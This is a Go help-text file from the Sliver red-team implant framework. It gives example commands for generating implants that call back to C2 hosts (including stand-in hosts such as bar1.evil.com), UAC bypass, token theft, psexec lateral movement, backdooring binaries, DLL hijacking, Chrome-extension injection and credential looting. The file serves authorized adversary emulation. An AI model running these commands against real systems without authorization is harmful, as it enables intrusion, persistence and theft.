package help

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	---
	This file contains all of the long-form help templates, all commands should have a long form help,
	even if the command is pretty simple. Try to include example commands in your template.
*/

import (
	"bytes"
	"fmt"
	"strings"
	"text/template"

	consts "github.com/bishopfox/sliver/client/constants"
)

const (
	sep = "."
)

var (

	// NOTE: For sub-commands use a "." hierarchy, for example root.sub for "sub" help
	cmdHelp = map[string]string{
		consts.JobsStr:          jobsHelp,
		consts.SessionsStr:      sessionsHelp,
		consts.BackgroundStr:    backgroundHelp,
		consts.InfoStr:          infoHelp,
		consts.UseStr:           useHelp,
		consts.GenerateStr:      generateHelp,
		consts.StagerStr:        generateStagerHelp,
		consts.StageListenerStr: stageListenerHelp,

		consts.MsfStr:              msfHelp,
		consts.MsfInjectStr:        msfInjectHelp,
		consts.PsStr:               psHelp,
		consts.PingStr:             pingHelp,
		consts.KillStr:             killHelp,
		consts.LsStr:               lsHelp,
		consts.CdStr:               cdHelp,
		consts.PwdStr:              pwdHelp,
		consts.CatStr:              catHelp,
		consts.DownloadStr:         downloadHelp,
		consts.UploadStr:           uploadHelp,
		consts.MkdirStr:            mkdirHelp,
		consts.RmStr:               rmHelp,
		consts.ProcdumpStr:         procdumpHelp,
		consts.ElevateStr:          elevateHelp,
		consts.RunAsStr:            runAsHelp,
		consts.ImpersonateStr:      impersonateHelp,
		consts.RevToSelfStr:        revToSelfHelp,
		consts.ExecuteAssemblyStr:  executeAssemblyHelp,
		consts.ExecuteShellcodeStr: executeShellcodeHelp,
		consts.MigrateStr:          migrateHelp,
		consts.SideloadStr:         sideloadHelp,
		consts.TerminateStr:        terminateHelp,
		consts.AliasesStr:          loadAliasHelp,
		consts.PsExecStr:           psExecHelp,
		consts.BackdoorStr:         backdoorHelp,
		consts.SpawnDllStr:         spawnDllHelp,

		consts.WebsitesStr:                  websitesHelp,
		consts.ScreenshotStr:                screenshotHelp,
		consts.MakeTokenStr:                 makeTokenHelp,
		consts.EnvStr:                       getEnvHelp,
		consts.EnvStr + sep + consts.SetStr: setEnvHelp,
		consts.RegistryWriteStr:             regWriteHelp,
		consts.RegistryReadStr:              regReadHelp,
		consts.RegistryCreateKeyStr:         regCreateKeyHelp,
		consts.RegistryDeleteKeyStr:         regDeleteKeyHelp,
		consts.PivotsStr:                    pivotsHelp,
		consts.WgPortFwdStr:                 wgPortFwdHelp,
		consts.WgSocksStr:                   wgSocksHelp,
		consts.SSHStr:                       sshHelp,
		consts.DLLHijackStr:                 dllHijackHelp,
		consts.GetPrivsStr:                  getPrivsHelp,

		// Loot
		consts.LootStr: lootHelp,

		// Profiles
		consts.ProfilesStr + sep + consts.NewStr:      newProfileHelp,
		consts.ProfilesStr + sep + consts.GenerateStr: generateProfileHelp,

		// Reactions
		consts.ReactionStr:                         reactionHelp,
		consts.ReactionStr + sep + consts.SetStr:   reactionSetHelp,
		consts.ReactionStr + sep + consts.UnsetStr: reactionUnsetHelp,

		consts.Cursed + sep + consts.CursedChrome: cursedChromeHelp,

		// Builders
		consts.BuildersStr: buildersHelp,
	}

	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
	[[.Bold]]About:[[.Normal]] Manage jobs/listeners.`

	sessionsHelp = `[[.Bold]]Command:[[.Normal]] sessions <options>
[[.Bold]]About:[[.Normal]] List Sliver sessions, and optionally interact or kill a session.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active Sliver.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <sliver name/session>
[[.Bold]]About:[[.Normal]] Get information about a Sliver by name, or for the active Sliver.`

	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name/session]
[[.Bold]]About:[[.Normal]] Switch the active Sliver, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

[[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, 
then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
	generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


[[.Bold]][[.Underline]]++ Formats ++[[.Normal]]
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
	generate --mtls foo.example.com 
	generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
	generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
	generate --os mac --mtls foo.example.com 

To output a Linux ELF executable file, the following command would be used:
	generate --os linux --mtls foo.example.com 


[[.Bold]][[.Underline]]++ DNS Canaries ++[[.Normal]]
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
and which implant file was discovered along with any affected sessions.

[[.Bold]]Important:[[.Normal]] You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
canaries and their status using the "canaries" command:
	generate --mtls foo.example.com --canary 1.foobar.com

[[.Bold]][[.Underline]]++ Execution Limits ++[[.Normal]]
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.
`
	generateStagerHelp = `[[.Bold]]Command:[[.Normal]] generate stager <options>
[[.Bold]]About:[[.Normal]] Generate a new sliver stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --format.

[[.Bold]][[.Underline]]++ Bad Characters ++[[.Normal]]
Bad characters must be specified like this for single bytes:

generate stager -b 00

And like this for multiple bytes:

generate stager -b '00 0a cc'

[[.Bold]][[.Underline]]++ Output Formats ++[[.Normal]]
You can use the --format flag to print out the shellcode to stdout, in one of the following transform formats:
[[.Bold]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
`
	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
[[.Bold]]Examples:[[.Normal]] 

The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile

To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:

profiles new --format shellcode --mtls 1.2.3.4 --skip-symbols windows-shellcode
`

	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new <options> <profile name>
[[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Profiles are an easy way to save an implant configuration and easily generate multiple copies of the binary with the same
settings. Generated implants will still have per-binary certificates/obfuscation/etc. This command is used with "profiles generate":
	profiles new --mtls foo.example.com --canary 1.foobar.com my-profile-name
	profiles generate my-profile-name
`

	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate [name] <options>
[[.Bold]]About:[[.Normal]] Generate an implant from a saved profile (see 'profiles new --help').`

	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`

	msfInjectHelp = `[[.Bold]]Command:[[.Normal]] inject [--pid] [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in a remote process.`

	psHelp = `[[.Bold]]Command:[[.Normal]] ps <options>
[[.Bold]]About:[[.Normal]] List processes on remote system.`

	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <implant name/session>
[[.Bold]]About:[[.Normal]] Ping session by name or the active session. This does NOT send an ICMP packet, it just sends a small 
C2 message round trip to ensure the remote implant is still responding to commands.`

	killHelp = `[[.Bold]]Command:[[.Normal]] kill <implant name/session>
[[.Bold]]About:[[.Normal]] Kill a remote implant process (does not delete file).`

	lsHelp = `[[.Bold]]Command:[[.Normal]] ls <remote path>
[[.Bold]]About:[[.Normal]] List remote files in current directory, or path if provided.

[[.Bold]][[.Underline]]Sorting[[.Normal]]
Directory and file listings are sorted by name in ascending order by default.  Listings can also be sorted by size (-s) and modified time (-m).  All sorts can be reversed with -r.

[[.Bold]][[.Underline]]Filters[[.Normal]]
Filters are a way to limit search results to directory and file names matching given criteria.

Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
/etc/passwd will display the listing for /etc/passwd.  "/etc/" is the path, and "passwd" is the filter.

Directory and file listings can be filtered using the following patterns:
'*': Wildcard, matches any sequence of non-path separators (slashes)
	Example: n*.txt will match all file and directory names starting with n and ending with .txt

'?': Single character wildcard, matches a single non-path separator (slashes)
	Example: s?iver will match all file and directory names starting with s followed by any non-separator character and ending with iver.

'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all directory and file names that start with a, b, or c.
		^[r-u] will match all characters except r, s, t, and u.

If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
On Windows, escaping is disabled. Instead, '\\' is treated as path separator.
`

	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [remote path]
[[.Bold]]About:[[.Normal]] Change working directory of the active session.`

	pwdHelp = `[[.Bold]]Command:[[.Normal]] pwd
[[.Bold]]About:[[.Normal]] Print working directory of the active session.`

	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir [remote path]
[[.Bold]]About:[[.Normal]] Create a remote directory.`

	rmHelp = `[[.Bold]]Command:[[.Normal]] rm [remote path]
[[.Bold]]About:[[.Normal]] Delete a remote file or directory.`

	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path> 
[[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`

	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
[[.Bold]]About:[[.Normal]] Download a file or directory from the remote system. Directories will be downloaded as a gzipped TAR file.
[[.Bold]][[.Underline]]Filters[[.Normal]]
Filters are a way to limit downloads to file names matching given criteria. Filters DO NOT apply to directory names.

Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
download /etc/*.conf will download all files from /etc whose names end in .conf. /etc/ is the path, *.conf is the filter.

Downloads can be filtered using the following patterns:
'*': Wildcard, matches any sequence of non-path separators (slashes)
	Example: n*.txt will match all file names starting with n and ending with .txt

'?': Single character wildcard, matches a single non-path separator (slashes)
	Example: s?iver will match all file names starting with s followed by any non-separator character and ending with iver.

'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all file names that start with a, b, or c.
		^[r-u] will match all characters except r, s, t, and u.

If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`

	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
[[.Bold]]About:[[.Normal]] Upload a file to the remote system.`

	procdumpHelp = `[[.Bold]]Command:[[.Normal]] procdump [pid]
[[.Bold]]About:[[.Normal]] Dumps the process memory given a process identifier (pid)`

	runAsHelp = `[[.Bold]]Command:[[.Normal]] runas [--username] [--process] [--args]
[[.Bold]]About:[[.Normal]] (Windows Only) Run a new process in the context of the designated user`

	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate USERNAME
[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Sliver commands that run new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`

	revToSelfHelp = `[[.Bold]]Command:[[.Normal]] rev2self
[[.Bold]]About:[[.Normal]] (Windows Only) Call RevertToSelf, lose the stolen token.`

	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new Sliver session as an elevated process (UAC bypass)`

	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly [local path to assembly] [arguments]
[[.Bold]]About:[[.Normal]] (Windows Only) Executes the .NET assembly in a child process.
`

	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode [local path to raw shellcode]
[[.Bold]]About:[[.Normal]] Executes the given shellcode in the implant's process.

[[.Bold]][[.Underline]]++ Shellcode ++[[.Normal]]
Shellcode files should be binary encoded, you can generate Sliver shellcode files with the generate command:
	generate --format shellcode
`

	migrateHelp = `[[.Bold]]Command:[[.Normal]] migrate <pid>
[[.Bold]]About:[[.Normal]] (Windows Only) Migrates into the process designated by <pid>.`

	websitesHelp = `[[.Bold]]Command:[[.Normal]] websites <options> <operation>
[[.Bold]]About:[[.Normal]] Add content to HTTP(S) C2 websites to make them look more legit.

Websites can be thought of as a collection of content identified by a name, Sliver can store any number of
websites, and each website can host any amount of static content mapped to arbitrary paths. For example, you
could create a 'blog' website and 'corp' website each with its own collection of content. When starting an
HTTP(S) C2 listener you can specify which collection of content to host on the C2 endpoint.

[[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
List websites:
	websites

List the contents of a website:
	websites [name]

Add content to a website:
	websites add-content --website blog --web-path / --content ./index.html
	websites add-content --website blog --web-path /public --content ./public --recursive

Delete content from a website:
	websites rm-content --website blog --web-path /index.html
	websites rm-content --website blog --web-path /public --recursive

`
	sideloadHelp = `[[.Bold]]Command:[[.Normal]] sideload <options> <filepath to DLL>
[[.Bold]]About:[[.Normal]] Load and execute a shared library in memory in a remote process.
[[.Bold]]Example usage:[[.Normal]]

Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
	sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
Sideload a Linux shared library into a new bash process using LD_PRELOAD:
	sideload -p /bin/bash /tmp/mylib.so
Sideload a Windows DLL as shellcode in a new process using Donut, specifying the entrypoint and its arguments:
	sideload -e MyEntryPoint /tmp/mylib.dll "argument to the function MyEntryPoint"

[[.Bold]]Remarks:[[.Normal]]
Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
terminates before responding. This will also prevent the hosting process to run indefinitely.
This is not required on Windows since the payload is injected as a new remote thread, and we wait for the thread completion before
killing the hosting process.

Parameters to the Linux and MacOS shared module are passed using the [[.Bold]]LD_PARAMS[[.Normal]] environment variable.
`
	spawnDllHelp = `[[.Bold]]Command:[[.Normal]] spawndll <options> <filepath to DLL> [entrypoint arguments]
[[.Bold]]About:[[.Normal]] Load and execute a Reflective DLL in memory in a remote process.

[[.Bold]]--process[[.Normal]] - Process to inject into.
[[.Bold]]--export[[.Normal]] - Name of the export to call (default: ReflectiveLoader)
`

	terminateHelp = `[[.Bold]]Command:[[.Normal]] terminate PID
[[.Bold]]About:[[.Normal]] Kills a remote process designated by PID
`

	screenshotHelp = `[[.Bold]]Command:[[.Normal]] screenshot
[[.Bold]]About:[[.Normal]] Take a screenshot from the remote implant.
`
	loadAliasHelp = `[[.Bold]]Command:[[.Normal]] load-macro <directory path> 
[[.Bold]]About:[[.Normal]] Load a Sliver macro to add new commands.
Macros are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the macro file is a reflective DLL or not.
Load an macro:
	load /tmp/chrome-dump
Sliver macros have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] macro):
chrome-dump
├── chrome-dump.dll
├── chrome-dump.so
└── manifest.json
It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
{
  "macroName":"chrome-dump", // name of the macro, can be anything
  "macroCommands":[
    {
      "name":"chrome-dump", // name of the command available in the sliver client (no space)
      "entrypoint":"ChromeDump", // entrypoint of the shared library to execute
      "help":"Dump Google Chrome cookies", // short help message
      "allowArgs":false,  // make it true if the commands require arguments
	  "defaultArgs": "test", // if you need to pass a default argument
      "extFiles":[ // list of files, groupped per target OS
        {
		  "os":"windows", // Target OS for the following files. Values can be "windows", "linux" or "darwin"
          "files":{
            "x64":"chrome-dump.dll",
            "x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the macro directory
          }
        },
        {
          "os":"linux",
          "files":{
            "x64":"chrome-dump.so"
          }
        },
        {
          "os":"darwin",
          "files":{
            "x64":"chrome-dump.dylib"
          }
        }
      ],
      "isReflective":false // only set to true when using a reflective DLL
    }
  ]
}

Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which allows you to specify the process to inject into. The following default values are set:
 - Windows: c:\windows\system32\notepad.exe
 - Linux: /bin/bash
 - Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment
`
	psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
[[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.

This command uploads a Sliver binary generated on the fly from a profile.
The profile must be created with the [[.Bold]]service[[.Normal]] format, so that the service manager can properly start and stop the binary.

To create such a profile, use the [[.Bold]]profiles new[[.Normal]] command:

profiles new --format service --skip-symbols --mtls a.bc.de win-svc64

Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:

psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN

The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Sliver session.
`
	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
[[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
[[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"

[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --http ab.cd windows-shellcode
`
	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
[[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
You can specify a custon Logon Type using the [[.Bold]]--logon-type[[.Normal]] flag, which defaults to [[.Bold]]LOGON32_LOGON_NEW_CREDENTIALS[[.Normal]].
Valid types are:

LOGON_INTERACTIVE
LOGON_NETWORK
LOGON_BATCH
LOGON_SERVICE
LOGON_UNLOCK
LOGON_NETWORK_CLEARTEXT
LOGON_NEW_CREDENTIALS
`

	getEnvHelp = `[[.Bold]]Command:[[.Normal]] getenv [name]
[[.Bold]]About:[[.Normal]] Retrieve the environment variables for the current session. If no variable name is provided, lists all the environment variables.
[[.Bold]]Example:[[.Normal]] getenv SHELL
	`
	setEnvHelp = `[[.Bold]]Command:[[.Normal]] setenv [name]
[[.Bold]]About:[[.Normal]] Set an environment variable in the current process.
[[.Bold]]Example:[[.Normal]] setenv SHELL /bin/bash
	`
	regReadHelp = `[[.Bold]]Command:[[.Normal]] registry read PATH [name]
[[.Bold]]About:[[.Normal]] Read a value from the windows registry
[[.Bold]]Example:[[.Normal]] registry read --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
	`
	regWriteHelp = `[[.Bold]]Command:[[.Normal]] registry write PATH value [name]
[[.Bold]]About:[[.Normal]] Write a value to the windows registry
[[.Bold]]Example:[[.Normal]] registry write --hive HKLM --type dword "software\\google\\chrome\\BLBeacon\\version" 1234

The type flag can take the following values:

- string (regular string)
- dword (uint32)
- qword (uint64)
- binary

When using the binary type, you must either:

- pass the value as an hex encoded string: registry write --type binary --hive HKCU "software\\bla\\key\\val" 0d0a90124f
- use the --path flag to provide a filepath containg the payload you want to write: registry write --type binary --path /tmp/payload.bin --hive HKCU "software\\bla\\key\\val"

	`
	regCreateKeyHelp = `[[.Bold]]Command:[[.Normal]] registry create PATH [name]
[[.Bold]]About:[[.Normal]] Read a value from the windows registry
[[.Bold]]Example:[[.Normal]] registry create --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
	`

	regDeleteKeyHelp = `[[.Bold]]Command:[[.Normal]] registry delete PATH [name]
[[.Bold]]About:[[.Normal]] Remove a value from the windows registry
[[.Bold]]Example:[[.Normal]] registry delete --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
	`

	pivotsHelp = `[[.Bold]]Command:[[.Normal]] pivots
[[.Bold]]About:[[.Normal]] List pivots for the current session. NOTE: pivots are only supported on sessions, not beacons.
[[.Bold]]Examples:[[.Normal]]

List pivots for the current session:

	pivots

Start a tcp pivot on the current session:

	pivots tcp --bind 0.0.0.0

`
	wgSocksHelp = `[[.Bold]]Command:[[.Normal]] wg-socks
[[.Bold]]About:[[.Normal]] Create a socks5 listener on the implant Wireguard tun interface
[[.Bold]]Examples:[[.Normal]]
Start a new listener:

	wg-socks start

Specify the listening port:

	wg-socks start --bind 1234

List existing listeners:

	wg-socks

Stop and remove an existing listener:

	wg-socks rm 0
`
	wgPortFwdHelp = `[[.Bold]]Command:[[.Normal]] wg-portfwd
[[.Bold]]About:[[.Normal]] Create a TCP port forward on the implant Wireguard tun interface
[[.Bold]]Examples:[[.Normal]]
Add a new forwarding rule:

	wg-portfwd add --remote 1.2.3.4:1234

Specify the listening port:

	wg-portfwd add --bind 1234 --remote 1.2.3.4

List existing listeners:

	wg-portfwd

Stop and remove an existing listener:

	wg-portfwd rm 0
`
	sshHelp = `[[.Bold]]Command:[[.Normal]] ssh
[[.Bold]]About:[[.Normal]] Run an one-off SSH command via the implant.
The built-in client will use the ssh-agent to connect to the remote host.
The username will be the current session username by default, but is configurable using the "-l" flag.
[[.Bold]]Examples:[[.Normal]]

# Connect to a remote host named "bastion" and execute "cat /etc/passwd"
ssh bastion cat /etc/passwd

# Connect to a remote host by specifying a username
ssh -l ubuntu ec2-instance ps aux
`

	lootHelp = `[[.Bold]]Command:[[.Normal]] loot
[[.Bold]]About:[[.Normal]] Store and share loot between operators.

A piece of loot can be one of two loot types: a file or a credential. 

[[.Bold]]File Loot[[.Normal]]
A file can be binary or text, Sliver will attempt to detect the type of file automatically or you can specify 
a file type with --file-type. You can add local files as loot using the "local" sub-command, or you can add
files from a session using the "remote" sub-command.

[[.Bold]]Credential Loot[[.Normal]]
Credential loot can be a user/password combination, an API key, or a file. You can add user/password and API
keys using the "creds" sub-command. To add credential files use either the "local" or "remote" sub-commands
with a "--type cred" flag (note the distinction between loot type --type, and file type --file-type). You can
additionally specify a --file-type (binary or text) as you would normally.

[[.Bold]]Examples:[[.Normal]]

# Adding a local file (file paths are relative):
loot local ./foo.txt

# Adding a remote file from the active session:
loot remote C:/foo.txt

# Adding a remote file as a credential from the active session:
loot remote --type cred id_rsa

# Display only credentials:
loot --filter creds

# Display the contents of a piece of loot:
loot fetch
`

	reactionHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction
[[.Bold]]About:[[.Normal]] Automate commands in reaction to event(s). The built-in
reactions do not support variables or logic, they simply allow you to run verbatim
commands when an event occurs. To implement complex event-based logic we recommend
using SliverPy (Python) or sliver-script (TypeScript/JavaScript).

[[.Bold]]Reactable Events:[[.Normal]]
% 20s  Triggered when a new session is opened to a target
% 20s  Triggered on changes to session metadata
% 20s  Triggered when a session is closed (for any reason)
% 20s  Triggered when a canary is burned or created
% 20s  Triggered when implants are discovered on threat intel platforms
% 20s  Triggered when a new piece of loot is added to the server
% 20s  Triggered when a piece of loot is removed from the server
`,
		consts.SessionOpenedEvent,
		consts.SessionUpdateEvent,
		consts.SessionClosedEvent,
		consts.CanaryEvent,
		consts.WatchtowerEvent,
		consts.LootAddedEvent,
		consts.LootRemovedEvent,
	)

	reactionSetHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction set
[[.Bold]]About:[[.Normal]] Set automated commands in reaction to event(s).  

The built-in reactions do not support variables or logic, they simply allow you to 
run verbatim commands when an event occurs. To implement complex event-based logic 
we recommend using SliverPy (Python) or sliver-script (TypeScript/JavaScript).

[[.Bold]]Examples:[[.Normal]]
# The command uses interactive menus to build a reaction. Simply run:
reaction set

[[.Bold]]Reactable Events:[[.Normal]]
% 20s  Triggered when a new session is opened to a target
% 20s  Triggered on changes to session metadata
% 20s  Triggered when a session is closed (for any reason)
% 20s  Triggered when a canary is burned or created
% 20s  Triggered when implants are discovered on threat intel platforms
% 20s  Triggered when a new piece of loot is added to the server
% 20s  Triggered when a piece of loot is removed from the server
	`,
		consts.SessionOpenedEvent,
		consts.SessionUpdateEvent,
		consts.SessionClosedEvent,
		consts.CanaryEvent,
		consts.WatchtowerEvent,
		consts.LootAddedEvent,
		consts.LootRemovedEvent,
	)

	reactionUnsetHelp = `[[.Bold]]Command:[[.Normal]] reaction unset
[[.Bold]]About:[[.Normal]] Unset/remove automated commands in reaction to event(s).

[[.Bold]]Examples:[[.Normal]]
# Remove a reaction
reaction unset --id 1
`
	dllHijackHelp = `[[.Bold]]Command:[[.Normal]] dllhijack
[[.Bold]]About:[[.Normal]] Prepare and plant a DLL on the remote system for a hijack scenario.
The planted DLL will have its export directory modified to forward the exports to a reference DLL
on the remote system.
The DLL used for the hijack can either be a file on the operator's system or built from a Sliver profile,
supplied with the --profile flag.

[[.Bold]]Examples:[[.Normal]]
# Use a local DLL for a hijack
dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --file /tmp/blah.dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll

# Use a Sliver generated DLL for the hijack (you must specify -R or --run-at-load)
profiles new --format shared --mtls 1.2.3.4:1234 --profile-name dll --run-at-load
dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll

# Use a local DLL as the reference DLL
dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --reference-file /tmp/msasn1.dll.orig --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
`

	getPrivsHelp = `[[.Bold]]Command:[[.Normal]] getprivs
[[.Bold]]About:[[.Normal]] Get privilege information for the current process (Windows only).
`

	cursedChromeHelp = `[[.Bold]]Command:[[.Normal]] cursed chrome
[[.Bold]]About:[[.Normal]] Injects a Cursed Chrome payload into an existing Chrome extension.

If no extension is specified, Sliver will enumerate all installed extensions, extract their
permissions and determine a valid target for injection. For Cursed Chrome to work properly
the target extension must have either of these two sets of permissions:

1. "webRequest" "webRequestBlocking" "<all_urls>" 
2. "webRequest" "webRequestBlocking" "http://*/*" "https://*/*" 

More information: https://github.com/mandatoryprogrammer/CursedChrome
`

	buildersHelp = `[[.Bold]]Command:[[.Normal]] builders
[[.Bold]]About:[[.Normal]] Lists external builders currently registered with the server.

External builders allow the Sliver server offload implant builds onto external machines.
For more information: https://github.com/BishopFox/sliver/wiki/External-Builders
`
)

const (
	// ANSI Colors
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"
)

// GetHelpFor - Get help string for a command
func GetHelpFor(cmdName []string) string {
	if 0 < len(cmdName) {
		if helpTmpl, ok := cmdHelp[strings.Join(cmdName, sep)]; ok {
			return FormatHelpTmpl(helpTmpl)
		}
	}
	return ""
}

// FormatHelpTmpl - Applies format template to help string
func FormatHelpTmpl(helpStr string) string {
	outputBuf := bytes.NewBufferString("")
	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(helpStr)
	tmpl.Execute(outputBuf, struct {
		Normal    string
		Bold      string
		Underline string
		Black     string
		Red       string
		Green     string
		Orange    string
		Blue      string
		Purple    string
		Cyan      string
		Gray      string
	}{
		Normal:    normal,
		Bold:      bold,
		Underline: underline,
		Black:     black,
		Red:       red,
		Green:     green,
		Orange:    orange,
		Blue:      blue,
		Purple:    purple,
		Cyan:      cyan,
		Gray:      gray,
	})
	return outputBuf.String()
}
